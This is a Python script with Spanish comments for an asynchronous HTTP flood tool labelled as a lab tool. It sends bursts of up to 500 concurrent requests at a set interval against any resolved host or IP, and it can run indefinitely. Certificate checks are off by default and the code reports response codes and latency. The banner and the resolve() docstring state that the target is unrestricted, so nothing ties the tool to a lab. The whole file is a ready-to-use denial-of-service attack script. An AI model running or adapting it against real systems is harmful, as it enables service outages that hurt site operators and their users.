"""Flood HTTP por ráfagas contra el destino del laboratorio.

Modo de uso principal:

    --requests N --every S    lanza N peticiones y espera S segundos
    --forever                 repite hasta Ctrl+C

El nombre DNS se resuelve una sola vez; las peticiones van a la IP resuelta
y llevan el `Host` original para que el servidor virtual correcto responda.
"""

import argparse
import asyncio
import json
import signal
import socket
import ssl
import time

# Topes duros del laboratorio (por contenedor).
MAX_REQUESTS = 500       # peticiones por ráfaga
MAX_CONCURRENCY = 400    # peticiones simultáneas
MAX_EVERY = 3600.0       # segundos entre ráfagas
MAX_DURATION = 86400     # segundos (24 h) cuando no es infinito


def parse_target(value: str, default_port: int | None = None) -> tuple[str, int]:
    """Acepta 'host', 'host:puerto' o 'esquema://host:puerto'."""
    raw = value.strip()
    if "://" in raw:
        from urllib.parse import urlparse

        parsed = urlparse(raw)
        host = parsed.hostname or ""
        port = parsed.port or default_port
    elif raw.count(":") == 1:
        host, _, raw_port = raw.partition(":")
        port = int(raw_port) if raw_port.isdigit() else default_port
    else:
        host, port = raw, default_port

    if not host:
        raise ValueError(f"destino invalido: '{value}'")
    if port is None:
        raise ValueError("falta el puerto: usa --port o 'host:puerto'")
    if not 1 <= port <= 65535:
        raise ValueError(f"puerto fuera de rango: {port}")
    return host, port


def resolve(host: str, port: int) -> str:
    """Resuelve `host` a una dirección IP utilizable, sin restricción de red."""
    try:
        infos = socket.getaddrinfo(host, port, proto=socket.IPPROTO_TCP)
    except socket.gaierror as exc:
        raise ValueError(f"no se pudo resolver '{host}': {exc}") from exc

    for info in infos:
        if info[4][0]:
            return info[4][0]
    raise ValueError(f"'{host}' no tiene direcciones utilizables")


def clamp(name: str, value: float, maximum: float) -> float:
    """Recorta un parámetro al tope duro e informa cuando lo hace."""
    if value <= 0:
        raise ValueError(f"{name} debe ser > 0 (recibido {value})")
    if value > maximum:
        print(f"[limite] {name}={value} excede el tope del lab, se usa {maximum}")
        return maximum
    return value


def build_request(method: str, path: str, host_header: str, data: str, content_type: str) -> bytes:
    """Construye una peticion HTTP/1.1 (GET o POST/PUT con cuerpo)."""
    headers = [
        f"{method} {path} HTTP/1.1",
        f"Host: {host_header}",
        "User-Agent: ddos-lab/2.0",
        "Accept: */*",
    ]
    body = data.encode() if data else b""
    if body:
        headers.append(f"Content-Type: {content_type}")
        headers.append(f"Content-Length: {len(body)}")
    headers.append("Connection: close")
    return ("\r\n".join(headers) + "\r\n\r\n").encode() + body


async def _one(
    ip: str,
    port: int,
    request: bytes,
    sni: str,
    ctx,
    timeout: float,
    sem,
) -> tuple[int, float]:
    """Una peticion. Devuelve (codigo, latencia_ms); 0 si no hubo respuesta."""
    started = time.perf_counter()
    async with sem:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(
                    ip, port, ssl=ctx, server_hostname=sni if ctx else None
                ),
                timeout=timeout,
            )
        except (OSError, asyncio.TimeoutError, ssl.SSLError):
            return 0, (time.perf_counter() - started) * 1000

        try:
            writer.write(request)
            await asyncio.wait_for(writer.drain(), timeout=timeout)
            head = await asyncio.wait_for(reader.readuntil(b"\r\n"), timeout=timeout)
            parts = head.split()
            code = int(parts[1]) if len(parts) >= 2 and parts[1].isdigit() else 0
            return code, (time.perf_counter() - started) * 1000
        except (OSError, asyncio.TimeoutError, asyncio.IncompleteReadError):
            return 0, (time.perf_counter() - started) * 1000
        finally:
            writer.close()
            try:
                await writer.wait_closed()
            except (OSError, asyncio.TimeoutError):
                pass


async def _burst(
    ip, port, request, sni, ctx, requests, timeout, sem
) -> list[tuple[int, float]]:
    """Lanza `requests` peticiones en paralelo, acotadas por el semaforo."""
    tasks = [
        asyncio.create_task(_one(ip, port, request, sni, ctx, timeout, sem))
        for _ in range(requests)
    ]
    return await asyncio.gather(*tasks)


def _fmt_codes(codes: dict[int, int]) -> str:
    """Resumen compacto de codigos para una linea de consola."""
    return " ".join(
        f"{'sin-resp' if code == 0 else code}:{count}"
        for code, count in sorted(codes.items())
    )


async def run(args, ip, host_header) -> None:
    """Bucle de rafagas: finito por duracion o infinito hasta Ctrl+C."""
    sem = asyncio.Semaphore(MAX_CONCURRENCY)
    requests = int(clamp("requests", args.requests, MAX_REQUESTS))
    every = clamp("every", args.every, MAX_EVERY)

    # Coherencia: si pides mas ritmo del permitido, recorta la rafaga.
    if requests / every > MAX_REQUESTS:
        requests = max(1, int(MAX_REQUESTS * every))
        print(f"[limite] ritmo ajustado a {requests} peticiones cada {every:g}s")

    print("=" * 66)
    scheme = "https" if args.https else "http"
    port_suffix = "" if args.port in (80, 443) else f":{args.port}"
    print(f"  DESTINO   : {args.method} {scheme}://{args.dns}{port_suffix}{args.path}  ->  {ip}")
    print(f"  PATRON    : {requests} peticiones cada {every:g}s"
          f"  ({requests / every:.0f} req/s por contenedor)")
    print(f"  MODO      : {'INFINITO (Ctrl+C para parar)' if args.forever else f'{args.duration:g}s'}")
    print(f"  AMBITO    : destino libre (sin restriccion de red)")
    print("=" * 66, flush=True)

    request = build_request(args.method, args.path, host_header, args.data, args.content_type)

    ctx = None
    if args.https:
        ctx = ssl.create_default_context()
        if not args.verify:
            # Certificados de laboratorio: self-signed o CA propia.
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

    # Ctrl+C y SIGTERM (docker stop) paran el bucle de forma ordenada para que
    # el resumen final se imprima igualmente.
    stop = asyncio.Event()
    loop = asyncio.get_running_loop()
    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            loop.add_signal_handler(sig, stop.set)
        except (NotImplementedError, RuntimeError):
            pass

    started = time.perf_counter()
    deadline = None if args.forever else started + args.duration
    total_codes: dict[int, int] = {}
    total = 0
    bursts = 0
    tick = started

    while not stop.is_set():
        if deadline is not None and time.perf_counter() >= deadline:
            break

        results = await _burst(
            ip,
            args.port,
            request,
            args.dns,
            ctx,
            requests,
            args.timeout,
            sem,
        )
        bursts += 1
        codes: dict[int, int] = {}
        for code, _ in results:
            codes[code] = codes.get(code, 0) + 1
            total_codes[code] = total_codes.get(code, 0) + 1
        total += len(results)

        latencies = sorted(lat for _, lat in results)
        p95 = latencies[min(len(latencies) - 1, int(len(latencies) * 0.95))]

        print(
            f"  rafaga {bursts:>5} · {len(results):>3} enviadas · "
            f"{_fmt_codes(codes):<32} · p95 {p95:6.1f} ms",
            flush=True,
        )

        if stop.is_set():
            break
        if deadline is not None and time.perf_counter() >= deadline:
            break

        tick += every
        delay = tick - time.perf_counter()
        if delay > 0:
            # Espera interrumpible: si llega la senal, sale del bucle ya.
            try:
                await asyncio.wait_for(stop.wait(), timeout=delay)
            except asyncio.TimeoutError:
                pass

    elapsed = time.perf_counter() - started
    print("\n" + "-" * 66)
    print(f"  rafagas      : {bursts}")
    print(f"  peticiones   : {total}")
    print(f"  duracion     : {elapsed:.1f}s")
    print(f"  ritmo medio  : {total / elapsed if elapsed else 0:.1f} req/s")
    print(f"  por codigo   : {_fmt_codes(total_codes)}")
    print("-" * 66, flush=True)

    print(
        "RESULT:"
        + json.dumps(
            {
                "kind": "http",
                "bursts": bursts,
                "received": total,
                "duration_s": round(elapsed, 1),
                "codes": {str(k): v for k, v in total_codes.items()},
            },
            sort_keys=True,
        ),
        flush=True,
    )


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Flood HTTP por rafagas (laboratorio)"
    )
    parser.add_argument("--dns", required=True, help="nombre DNS o IP del destino")
    parser.add_argument("--port", type=int, default=None, help="puerto del destino (def. 80, o 443 con --https)")
    parser.add_argument("--path", default="/", help="ruta HTTP (def. /)")
    parser.add_argument("--method", default="GET", help="metodo HTTP (GET, POST, PUT, ...)")
    parser.add_argument("--data", default="", help="cuerpo de la peticion (para POST/PUT)")
    parser.add_argument("--content-type", default="application/json", help="Content-Type cuando hay --data")
    parser.add_argument("--requests", type=int, default=50, help="peticiones por rafaga")
    parser.add_argument("--every", type=float, default=1.0, help="segundos entre rafagas")
    parser.add_argument("--duration", type=float, default=30.0, help="segundos totales")
    parser.add_argument("--forever", action="store_true", help="no termina hasta Ctrl+C")
    parser.add_argument("--https", action="store_true", help="hablar TLS (puerto 443)")
    parser.add_argument(
        "--verify",
        action="store_true",
        help="validar el certificado (por defecto se acepta cualquiera, para labs)",
    )
    parser.add_argument("--timeout", type=float, default=3.0, help="timeout por peticion")
    args = parser.parse_args()

    if args.port is None:
        args.port = 443 if args.https else 80

    try:
        host, port = parse_target(args.dns, args.port)
        ip = resolve(host, port)
    except ValueError as exc:
        print(f"[abortado] {exc}")
        raise SystemExit(2)

    args.dns, args.port = host, port
    if port == 443:
        args.https = True
    host_header = host if port in (80, 443, 8080) else f"{host}:{port}"

    if not args.forever:
        args.duration = clamp("duration", args.duration, MAX_DURATION)

    try:
        asyncio.run(run(args, ip, host_header))
    except KeyboardInterrupt:
        print("\n  interrumpido")


if __name__ == "__main__":
    main()
